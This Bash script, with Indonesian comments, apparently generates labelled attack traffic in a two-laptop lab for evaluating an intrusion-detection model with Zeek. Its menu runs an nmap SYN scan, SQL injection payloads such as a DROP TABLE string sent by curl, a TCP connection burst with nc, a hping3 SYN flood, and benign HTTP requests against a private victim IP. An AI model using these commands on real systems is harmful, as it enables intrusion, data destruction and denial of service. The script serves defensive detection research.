#!/bin/bash
# ============================================================
# run_attacks.sh - Script Serangan untuk Attacker Laptop
# Jalankan di Attacker Laptop
# IP Attacker: 192.168.1.20
# IP Victim  : 192.168.1.10
# ============================================================

VICTIM_IP="192.168.1.10"
INTERFACE="eth0"   # Ganti sesuai interface

echo "============================================================"
echo " ATTACKER LAPTOP - Attack Script"
echo " Target: $VICTIM_IP"
echo "============================================================"

# Set IP static attacker
echo "[SETUP] Setting IP static 192.168.1.20..."
sudo ip addr add 192.168.1.20/24 dev $INTERFACE 2>/dev/null
sudo ip link set $INTERFACE up

# Cek koneksi ke victim
echo "[SETUP] Cek konektivitas ke victim..."
ping -c 2 $VICTIM_IP > /dev/null 2>&1
if [ $? -eq 0 ]; then
    echo "   [OK] Victim dapat dijangkau."
else
    echo "   [ERROR] Victim tidak bisa di-ping. Cek kabel & IP!"
    exit 1
fi

echo ""
echo "Pilih skenario serangan:"
echo "  1) Port Scanning (Zero-Day) - Nmap SYN Scan"
echo "  2) SQL Injection - HTTP payload"
echo "  3) Brute Force - TCP connection flood"
echo "  4) DoS SYN Flood - hping3"
echo "  5) Benign Traffic - HTTP normal"
echo "  6) Semua skenario berurutan (untuk evaluasi lengkap)"
echo ""
read -p "Pilihan [1-6]: " CHOICE

run_port_scan() {
    echo ""
    echo "=== [1] PORT SCANNING (Nmap SYN Scan) ==="
    echo "    Menjalankan: nmap -sS -p 1-1000 $VICTIM_IP"
    echo "    Catatan: Skenario Zero-Day - tidak ada di training data model"
    echo ""
    sudo nmap -sS -p 1-1000 $VICTIM_IP
    echo "    [DONE] Port scan selesai."
}

run_sqli() {
    echo ""
    echo "=== [2] SQL INJECTION ==="
    echo "    Target: http://$VICTIM_IP:8080"
    echo ""
    # Beberapa variasi payload SQLi
    payloads=(
        "1'UNION SELECT 1,2,3--"
        "1' OR '1'='1"
        "1'; DROP TABLE users--"
        "' OR 1=1--"
        "admin'--"
    )
    for payload in "${payloads[@]}"; do
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
        echo "    Payload: $payload"
        curl -s "http://$VICTIM_IP:8080/login?id=$encoded" > /dev/null
        sleep 0.5
    done
    echo "    [DONE] SQLi payloads terkirim."
}

run_bruteforce() {
    echo ""
    echo "=== [3] BRUTE FORCE (TCP Connection Flood) ==="
    echo "    Target: $VICTIM_IP:2222"
    echo ""
    echo "    Mengirim 30 koneksi TCP berulang..."
    for i in $(seq 1 30); do
        nc -z -w1 $VICTIM_IP 2222 2>/dev/null
    done
    echo "    [DONE] Brute force selesai."
}

run_dos() {
    echo ""
    echo "=== [4] DoS SYN FLOOD (hping3) ==="
    echo "    Target: $VICTIM_IP:80"
    echo "    Durasi: 10 detik"
    echo ""
    if ! command -v hping3 >/dev/null; then
        echo "    [INSTALL] hping3 tidak ada, installing..."
        sudo apt install -y hping3 2>/dev/null
    fi
    sudo timeout 10 hping3 -S -p 80 --flood $VICTIM_IP 2>/dev/null || \
    sudo timeout 10 hping3 -S --destport 80 -c 1000 $VICTIM_IP 2>/dev/null
    echo "    [DONE] SYN flood selesai."
}

run_benign() {
    echo ""
    echo "=== [5] BENIGN TRAFFIC ==="
    echo "    HTTP requests normal ke $VICTIM_IP:8080"
    echo ""
    urls=(
        "http://$VICTIM_IP:8080/index.html"
        "http://$VICTIM_IP:8080/about"
        "http://$VICTIM_IP:8080/contact"
        "http://$VICTIM_IP:8080/style.css"
        "http://$VICTIM_IP:8080/logo.png"
    )
    for url in "${urls[@]}"; do
        echo "    GET $url"
        curl -s "$url" > /dev/null
        sleep 0.3
    done
    echo "    [DONE] Benign traffic selesai."
}

case $CHOICE in
    1) run_port_scan ;;
    2) run_sqli ;;
    3) run_bruteforce ;;
    4) run_dos ;;
    5) run_benign ;;
    6)
        echo ""
        echo "=== MENJALANKAN SEMUA SKENARIO BERURUTAN ==="
        echo "    Jeda 15 detik antara skenario."
        echo ""
        run_port_scan;  echo "    Jeda 15 detik..."; sleep 15
        run_sqli;       echo "    Jeda 15 detik..."; sleep 15
        run_bruteforce; echo "    Jeda 15 detik..."; sleep 15
        run_dos;        echo "    Jeda 15 detik..."; sleep 15
        run_benign
        echo ""
        echo "=== SEMUA SKENARIO SELESAI ==="
        ;;
    *)
        echo "Pilihan tidak valid."
        exit 1
        ;;
esac

echo ""
echo "============================================================"
echo " Serangan selesai. Informasikan ke Victim Laptop"
echo " untuk menghentikan Zeek dan menjalankan evaluasi."
echo "============================================================"
